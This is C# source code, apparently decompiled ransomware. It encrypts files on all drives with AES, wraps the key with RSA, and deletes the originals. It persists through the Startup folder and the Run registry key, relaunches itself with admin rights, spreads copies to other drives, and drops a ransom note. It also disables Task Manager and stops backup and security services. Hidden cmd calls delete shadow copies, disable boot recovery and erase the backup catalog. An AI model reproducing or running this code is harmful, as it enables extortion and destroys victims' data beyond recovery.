	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
